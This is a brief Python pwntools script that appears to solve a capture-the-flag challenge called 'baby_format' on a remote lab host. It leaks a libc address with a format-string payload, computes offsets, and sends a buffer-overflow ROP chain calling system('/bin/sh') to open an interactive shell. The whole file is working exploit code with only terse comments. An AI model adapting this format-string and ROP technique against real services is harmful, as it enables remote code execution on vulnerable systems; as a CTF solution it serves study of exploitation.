from pwn import *
uu64    = lambda data               :u64(data.ljust(8, '\0'))
p = remote('elfs.owasp.si',40005)
#p = process('./baby_format')
pad = 120 * 'A'
#buf + 7
payload1 = '%13$p'
pop_rdi_ret = p64(0x0000000000400743)
ret = p64(0x00000000004004c6)

p.sendlineafter('again?\n',payload1)

leak = int(p.recvline()[7:21],16)
base = leak -231-0x000000000021b10
#calculate offset for libc start main print("testing:"+hex(base))
system = base+ 0x00000000004f550 
bin_sh = base+0x1b3e1a 

payload2 = pad
payload2 += pop_rdi_ret
payload2 += p64(bin_sh) #for leak 0x601018
payload2 += ret #for leak comment
payload2 += p64(system) #for leak 0x4004e0

print 'leak: '+hex(base)
p.sendlineafter('drink?\n',payload2)
#leak: p.recvline()
#leak: leak = uu64(p.recv(6))
#leak: print(hex(leak))
p.recvline()
p.interactive()
